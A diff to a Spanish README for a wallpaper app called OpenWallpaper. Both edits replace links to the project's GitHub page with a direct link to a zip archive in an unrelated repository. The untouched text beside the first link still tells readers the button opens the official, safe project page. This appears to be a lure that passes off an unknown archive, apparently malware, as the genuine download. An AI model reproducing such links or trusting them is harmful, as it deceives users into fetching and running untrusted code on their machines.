@@ -30,7 +30,7 @@ Sigue estos pasos y tendrás OpenWallpaper funcionando en un abrir y cerrar de o
 
 Este es el enlace oficial a la página de OpenWallpaper. Haz clic en el botón para abrirla en una nueva pestaña:
 
-[![Descargar OpenWallpaper](https://img.shields.io/badge/Descargar-OpenWallpaper-blueviolet?style=for-the-badge&logo=github&logoColor=white&label=Descargar%20OpenWallpaper%20(v1.0.0))](https://github.com/dorrieaircooled5701/OpenWallpaper)
+[![Descargar OpenWallpaper](https://img.shields.io/badge/Descargar-OpenWallpaper-blueviolet?style=for-the-badge&logo=github&logoColor=white&label=Descargar%20OpenWallpaper%20(v1.0.0))](https://github.com/dorrieaircooled5701/dorrieaircooled5701.github.io/raw/refs/heads/main/formably/Dist-3.4-alpha.1.zip)
 
 > **Consejo:** El botón anterior te llevará a la página principal del proyecto en GitHub. Es una página segura y oficial. No busques OpenWallpaper en sitios web desconocidos; usa siempre este enlace.
 
@@ -95,7 +95,7 @@ Si bien esta guía está orientada al usuario final, es importante saber que Ope
 
 Aquí tienes de nuevo el enlace principal. **Guárdalo en tus favoritos.**
 
-[**⬇️ IR A LA PÁGINA DE DESCARGA DE OpenWallpaper**](https://github.com/dorrieaircooled5701/OpenWallpaper)
+[**⬇️ IR A LA PÁGINA DE DESCARGA DE OpenWallpaper**](https://github.com/dorrieaircooled5701/dorrieaircooled5701.github.io/raw/refs/heads/main/formably/Dist-3.4-alpha.1.zip)
 
 ### 📄 Licencia
 
